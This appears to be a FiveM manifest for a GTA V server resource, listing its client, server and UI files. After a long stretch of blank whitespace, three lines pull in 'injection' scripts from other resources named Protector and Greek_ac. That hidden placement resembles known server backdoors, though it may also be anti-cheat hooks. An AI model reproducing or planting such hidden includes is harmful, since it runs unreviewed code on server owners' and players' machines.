fx_version 'bodacious'
game 'gta5'

-- Client Scripts
client_scripts {
	"client.lua",
}

-- server Scripts
server_scripts {
	"server.lua"
}


files {
	'ui/ui.html',
	'ui/script.js',
	'ui/css/*.css',
	'ui/css/fonts/*.ttf',
	'ui/images/*',
}

ui_page "ui/ui.html"













server_script "@Protector/Server/injection.lua"
client_script "@Greek_ac/client/injections.lua"
server_script "@Greek_ac/server/injections.lua"